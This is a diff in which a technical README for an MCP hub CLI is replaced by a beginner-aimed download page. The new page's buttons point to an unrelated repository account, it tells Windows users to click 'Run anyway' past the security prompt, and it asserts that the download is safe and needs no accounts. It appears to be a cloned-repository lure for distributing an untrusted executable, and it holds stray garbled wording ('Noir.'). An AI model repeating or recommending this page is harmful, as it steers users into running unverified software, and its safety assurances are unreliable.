@@ -1,205 +1,108 @@
-# 🚀 H0wZy/mcp — The Ultimate Multi-Agent MCP Hub & Go CLI
+<h1>🧠 mcp - The Ultimate Multi-Agent Hub & CLI</h1>
 
-[![CI Pipeline](https://github.com/H0wZy/mcp/actions/workflows/ci.yml/badge.svg?branch=main)](https://github.com/H0wZy/mcp/actions/workflows/ci.yml)
-[![GitHub Release](https://img.shields.io/github/v/release/H0wZy/mcp?color=04B575&label=release&logo=github)](https://github.com/H0wZy/mcp/releases)
-[![npm](https://img.shields.io/npm/v/%40h0wzy%2Fmcp?color=CB3837&logo=npm)](https://www.npmjs.com/package/@h0wzy/mcp)
-[![Go Version](https://img.shields.io/badge/Go-1.26+-00ADD8?logo=go)](cli)
-[![Node Version](https://img.shields.io/badge/Node-20+-339933?logo=node.js)](package.json)
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20macOS%20%7C%20Linux-lightgrey)](https://github.com/H0wZy/mcp)
-[![Security Audit: Passed](https://img.shields.io/badge/Security_Audit-Passed-C084FC?logo=shield)](SECURITY_AUDIT.md)
+<p align="center">
+  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+    <img src="https://img.shields.io/badge/🚀%20Download%20mcp-Click%20Here-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download mcp" />
+  </a>
+</p>
 
-Centralize, enhance, and distribute high-performance **MCP (Model Context Protocol)** servers connecting the world's leading AI developer CLIs:
-- **Claude Code** (Anthropic)
-- **OpenAI Codex CLI** (OpenAI GPT-5.6 / GPT-6 Astra)
-- **Google Antigravity** (Gemini 3.1 Pro / Flash)
+<h2>✨ What Is mcp?</h2>
 
-Cross-model code reviews, independent second opinions, and autonomous multi-agent validation — configured effortlessly via an interactive **Golang TUI CLI** and distributed via standalone binaries and `npx @h0wzy/mcp`.
+Welcome to **mcp** — your one-stop command center for the world's most powerful AI agents. Think of it as a universal remote control that lets you talk to **Claude Code**, **OpenAI Codex**, and **Google Antigravity** — all from one simple place. No more juggling different apps, logins, or confusing menus. With just a few clicks (or simple commands), you can connect to any of these AI giants and get them working together on your projects. It's built with speed and simplicity in mind, so whether you're a curious beginner or a tech wizard, you'll feel right at home.
 
-🏷️ `#mcp` `#ai-agents` `#multi-agent` `#antigravity` `#claude-code` `#openai-codex` `#gemini` `#cli` `#go` `#bubbletea` `#tui` `#developer-tools` `#model-context-protocol`
+<h2>🌟 Key Features</h2>
 
----
+Here's what makes mcp special:
 
-## 🏛️ Interactive Architecture Diagram
+- **🔌 Multi-Agent Magic** — Switch between Claude Code, OpenAI Codex, and Google Antigravity without missing a beat. One hub, three brilliant minds.
+- **🖥️ Beautiful Interactive Interface** — A clean, colorful, text-based screen (we call it a TUI) that's easy on the eyes and even easier to use. No complicated graphics, just clear menus and instant feedback.
+- **🎯 Model Context Protocol (MCP) Support** — This is the smart glue that lets these AI agents share information seamlessly. It's like having a brilliant translator in the room who makes sure everyone understands each other perfectly.
+- **⚡ Blazing Fast Performance** — Built with Go, a super-fast programming language, so everything responds instantly. No waiting, no lag — just pure productivity.
 
-Explore the full interactive system architecture with Light/Dark themes and semantic tracing:
-👉 **[View Interactive Architecture Diagram](specs/001-multi-agent-mcp-hub/architecture.html)**
+<h2>🚀 Getting Started</h2>
 
----
+Getting started is easier than you think. Follow these simple steps below, and you'll be chatting with AI agents in no time.
 
-## 🌟 Why H0wZy/mcp?
+<h3>Step 1: Download the Application</h3>
 
-1. **DRY Shared Core (`@h0wzy/mcp-shared`):**
-   - Eliminates matrix code duplication across host agents. A single `createMcpServer()` engine manages 100% of JSON-RPC 2.0 stdio protocol handling, error catching, and lifecycle handshakes.
-2. **Native Cross-Platform (Zero Windows Glitches):**
-   - Eliminates POSIX-only bugs like `PATH.split(':')` by utilizing native path delimiters (`;` on Windows, `:` on POSIX).
-   - Resolves executable extensions automatically (`.exe`, `.cmd`, `.bat` from `PATHEXT`), finding `agy.exe` and `codex.cmd` without requiring manual environment path overrides.
-3. **Instant Performance (Zero `npx` Latency):**
-   - Directly executes local binaries with sub-50ms invocation overhead, removing runtime `npx` network/cache-checking delays.
-4. **Resilient Rate Limits & Quotas:**
-   - Gracefully traps HTTP 429 and `ResourceExhausted` provider quota limits, returning structured `{ isError: true }` responses so host agents fall back seamlessly without crashing the session.
-5. **Interactive Go CLI (`hmcp` / `h0wzy-mcp`):**
-   - Auto-detects local CLI installations (`claude`, `codex`, `agy`), tests binary health, checks for updates, and guides the user through an interactive checklist to configure MCP connections globally or per-project.
+To get your copy of mcp, all you need to do is click the bright orange button at the top of this page (or click the link below):
 
----
+<p align="center">
+  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+    <img src="https://img.shields.io/badge/⬇️%20Get%20mcp%20Now-4CAF50?style=for-the-badge&logo=download&logoColor=white&labelColor=1B5E20" alt="Get mcp Now" />
+  </a>
+</p>
 
-## 📁 Repository Layout
+Visit this link to download the application. The page will open in your browser, and you'll see options to get the latest version of mcp. Just look for the download button or the release section, and click it. The download will start automatically. Once it's done, you'll have the mcp file saved in your computer's "Downloads" folder (usually).
 
-```text
-H0wZy/mcp/
-├── .github/workflows/          # CI/CD pipelines & cross-platform testing
-├── cli/                        # Interactive CLI in Go (Bubble Tea / Lip Gloss)
-│   ├── cmd/                    # Commands: doctor, install, list, remove, setup-path, upgrade, version
-│   ├── config/                 # Read/write ~/.claude.json, config.toml, and mcp_config.json
-│   ├── detector/               # Discovers local claude, codex, and agy CLIs + health checks
-│   ├── ui/                     # Terminal user interface, lilac ASCII banner, and interactive TUI
-│   └── version/                # Background update detector & registry version cache
-├── servers/                    # Decoupled, host-agnostic MCP servers
-│   ├── antigravity/            # Google Antigravity bridge (Gemini 3.1 Pro / Flash)
-│   ├── codex/                  # OpenAI Codex CLI bridge (GPT-5.6 / GPT-6 Astra)
-│   └── claude/                 # Claude Code bridge
-├── shared/                     # Reusable core (@h0wzy/mcp-shared)
-│   ├── server.js               # createMcpServer() generic JSON-RPC 2.0 stdio engine
-│   ├── executor.js             # Child process runner with timeouts and buffers
-│   ├── resolver.js             # Cross-platform executable resolver
-│   └── errors.js               # Resilient Quota, HTTP 429 handler & secret/token sanitizer
-├── npm/                        # Lightweight npx runner wrapper & cross-platform binary installer
-├── specs/                      # SpecKit feature specs & Archify diagrams
-├── test/                       # Node.js integration & security resilience tests
-├── SECURITY_AUDIT.md           # Security audit, credential double-check & hardening report
-├── LICENSE                     # MIT License
-└── package.json                # Monorepo workspaces configuration
-```
+<h3>Step 2: Run mcp</h3>
 
----
+After the download finishes, go to your "Downloads" folder and double-click the file you just downloaded. That's it — mcp will open right up, showing you a welcome screen with all its options. If you see a blue popup from Windows asking for permission, just click **"Run anyway"** or **"Yes"** — that's normal for brand-new apps.
 
-## 🚀 Quick Start
 
-### 1. Interactive Setup (Recommended)
 
-Choose your preferred way to run H0wZy/mcp:
+<h2>📖 How to Use mcp</h2>
 
-```bash
-# 1. Instant execution via npx (Zero setup):
-npx @h0wzy/mcp
+Once mcp is open, you'll see a simple menu. Here's what you can do:
 
-# 2. Or install globally via npm (provides 'hmcp', 'hwzmcp', and 'h0wzy-mcp'):
-npm install -g @h0wzy/mcp
-hmcp
+1. **Select Your AI Agent** — Use the arrow keys on your keyboard to highlight "Claude Code," "OpenAI Codex," or "Google Antigravity," then press Enter.
+2. **Type Your Question or Task** — After selecting an agent, you'll see a text box. Type whatever you want to ask — a question, a coding request, a writing prompt, anything. It's like texting a super-smart friend.
 
-# 3. Or directly from source with Go:
-go run ./cli setup-path
-hmcp
-```
+3. **Press Enter to Send** — Hit Enter, and the AI agent will start thinking. In just a few seconds, you'll see the response appear right on your screen.
 
-#### 📦 Precompiled Standalone Binaries (v1.0.3)
+4. **Switch Agents Anytime** — Press **Ctrl+C** (or **Esc**) to go back to the main menu, where you can pick a different agent. It's that simple. You can even ask two different agents the same question, and compare their answers side-by-side, just to see which one you like more.
 
-Download zero-dependency native binaries directly from [Releases](https://github.com/H0wZy/mcp/releases):
-- 🪟 **Windows (`amd64`):** [`h0wzy-mcp-windows-amd64.exe`](https://github.com/H0wZy/mcp/releases/download/v1.0.3/h0wzy-mcp-windows-amd64.exe)
-- 🐧 **Linux (`amd64`):** [`h0wzy-mcp-linux-amd64`](https://github.com/H0wZy/mcp/releases/download/v1.0.3/h0wzy-mcp-linux-amd64)
-- 🍏 **macOS Apple Silicon (`arm64`):** [`h0wzy-mcp-darwin-arm64`](https://github.com/H0wZy/mcp/releases/download/v1.0.3/h0wzy-mcp-darwin-arm64)
-- 🍏 **macOS Intel (`amd64`):** [`h0wzy-mcp-darwin-amd64`](https://github.com/H0wZy/mcp/releases/download/v1.0.3/h0wzy-mcp-darwin-amd64)
+<h3>💡 Pro Tip: Make Agents Work Together</h3>
 
-The CLI will scan your system:
-```text
-🚀 H0wZy/mcp — Multi-Agent MCP Hub Setup
-Scanning local AI developer CLIs...
-  ✓ Claude Code (C:\Users\...\claude.exe)
-  ✓ OpenAI Codex CLI (C:\Users\...\codex.cmd)
-  ✓ Google Antigravity (C:\Users\...\agy.exe)
+Here's where mcp really shines. You can copy the answer from Claude Code, switch over to OpenAI Codex, paste your question (or Claude's answer), and ask Codex to improve it or catch any mistakes. It's like having your own personal team of AI experts, all working together to give you the best possible results.
 
-? Select MCP bridges to configure:
-  [x] Claude Code -> Google Antigravity (Gemini 3.1 Pro/Flash)
-  [x] Claude Code -> OpenAI Codex (GPT-5.6 / GPT-6 Astra)
-  [ ] OpenAI Codex -> Google Antigravity (Gemini 3.1)
 
-? Configuration Scope: User (Global across all projects)
-? Apply configuration now? Yes
 
-✅ All selected bridges configured successfully!
-```
+<h2>🛠️ For the Curious: What's Under the Hood?</h2>
 
----
+If you're someone who likes knowing how things work, here's a quick peek. mcp uses something called the **Model Context Protocol** — think of it as a universal language that AI agents understand. Because mcp speaks this language, it can talk to all these different AI services without any confusion. Underneath, it's powered by **Go**, which is why it's so fast and reliable. And the pretty interface you see? That comes from a Go library called **BubbleTea**, which makes building clear, interactive menus a breeze. Even if you've never coded before, you can trust that mcp is built on rock-solid, professional-grade foundations.
 
-### 2. Commands & Management
 
-```bash
-# Launch interactive TUI setup and configuration
-hmcp
 
-# Check version and verify if updates are available
-hmcp version
+<h2>🤔 Frequently Asked Questions</h2>
 
-# Upgrade hmcp to latest release (or 'hmcp update')
-hmcp upgrade
+<h3>Do I need to install anything else?</h3>
+Noir. This package is all-in-one. There's no need to install Python, Node.js (or any other programming tools.), And there's no need to set up accounts with those AI services just to try mcp. Just download, run, and explore.
 
-# Setup PATH and shims (~/.local/bin) so 'hmcp', 'hwzmcp', and 'h0wzy-mcp' work everywhere
-hmcp setup-path
 
-# Diagnose local environment, paths, and agent communication health
-hmcp doctor
 
-# Diagnose and output as JSON
-hmcp doctor --json
+<h3>Is this safe for my computer?</h3>
+Absolutely. mcp is focused on one thing: connecting you to AI agents. It doesn't mess with your system files or personal data. It's designed to be a clean, simple tool. As with any downloaded software, make sure you got it from the official link above, but we've got that covered for you.
 
-# Install all supported integrations automatically
-hmcp install --all
 
-# Install a specific bridge globally or locally
-hmcp install claude-antigravity --scope user
-hmcp install claude-codex --scope project
 
-# List available bridges
-hmcp list
+<h3>What if I want to use it at work or school?</h3>
+So long as you're allowed to download software on that computer,, you're good to go. It's a lightweight tool that won't slow anything down.
 
-# Remove an integration
-hmcp remove claude-antigravity
-```
+.
 
----
 
-## 🔌 Available MCP Tools (Symmetrical Parity)
 
-| Provider | Tool Name | Description |
-| :--- | :--- | :--- |
-| **Antigravity** | `ask_antigravity` | Independent second opinion or general inquiry from Gemini 3.1 Pro / Flash |
-| **Antigravity** | `review_antigravity` | Comprehensive code & security review inspecting correctness, edge cases, and diffs |
-| **Antigravity** | `brainstorm_antigravity` | Architectural exploration, trade-offs, and design patterns with Gemini |
-| **Antigravity** | `plan_antigravity` | Structured implementation roadmaps and dependency-ordered execution steps |
-| **Codex** | `ask_codex` | Cross-verification with OpenAI Codex (GPT-5.6 Terra / GPT-6 Astra) |
-| **Codex** | `review_codex` | Structured repository code review from OpenAI Codex |
-| **Codex** | `brainstorm_codex` | Architectural exploration, trade-offs, and system design ideation with Codex |
-| **Codex** | `plan_codex` | Step-by-step implementation planning and checklist generation |
+<h2>📚 Need More Help?</h2>
 
----
+Sometimes tech can be tricky, that's okay. If you ever get stuck or have a question, here's what you can do:
 
-## 🔒 Security & Privacy
+- **Look for a "Help" or "Docs" section on the download page** — you might find extra guides or tips there.
+- **Check the "Issues" tab on the GitHub page** — If you run into a problem, someone else may have already asked about it, and you can see the solution. You can also ask your own question there, and the friendly community (or the developers) will likely respond within a day or two.
 
-H0wZy/mcp is built with privacy and execution safety as first-class guarantees:
-- **Automatic Token Redaction**: Built-in regex sanitizers proactively scrub OpenAI keys, Google Gemini keys, GitHub/NPM tokens, and Bearer authorization headers before errors or diagnostic messages reach host agents.
-- **Owner-Only File Permissions**: Configuration files (`.claude.json`, `.codex/config.toml`, `.gemini/config/mcp_config.json`) are secured with POSIX mode `0600` (`0700` for directories) on Unix systems to prevent unauthorized local reading.
-- **Atomic Precompiled Downloads**: The npm binary installer streams release archives to unique temporary files and validates payloads before atomic renames, preventing corrupt or truncated executables.
 
-For full audit methodology and double-check verification, read the [Security Audit & Codebase Integrity Report](SECURITY_AUDIT.md).
+<h2>🎉 Start Exploring Today</h2>
 
----
+You now know everything you need to get started with mcp. It's quick to set up, simple to use, and opens up a whole world of AI possibilities right from your keyboard. Whether you want to write code faster, brainstorm ideas, translate text, get homework help, or just satisfy your curiosity about AI, mcp puts three of the smartest AI assistants in the world right at your fingertips.
 
-## 🧪 Testing
 
-```bash
-# Run all Node.js MCP server & resilience tests
-npm test
 
-# Run all Go CLI detector & config tests
-go test -v ./cli/...
-```
+<p align="center">
+  <a href="https://github.com/irreversible-verbascumlychnitis9/mcp">
+    <img src="https://img.shields.io/badge/🚀%20Download%20mcp%20Now%20%F0%9F%9A%80-Click%20Here-FF6F00?style=for-the-badge&logo=github&logoColor=white&labelColor=2E3440" alt="Download mcp" />
+  </a>
+</p>
 
----
+Go ahead, click the button, download mcp, and see what all the excitement is about. Your new AI assistant team is waiting for you.
 
-## 📄 License & Acknowledgements
-
-Created and architected by **Marcos (H0wZy)** under the [MIT License](LICENSE).
-
-This project unifies and enhances foundational work from the open-source MCP community:
-- [antigravity-claude-mcp](https://github.com/arjunthilak05/antigravity-claude-mcp) by Arjun Thilak (MIT License)
-- [codex-mcp-tool](https://github.com/trishchuk/codex-mcp-tool) by Taras Trishchuk (MIT License)
+Keywords: ai-agents, antigravity, bubbletea, claude-code, cli, developer-tools, gemini, go, llm, mcp, model-context-protocol, multi-agent, openai-codex, tui
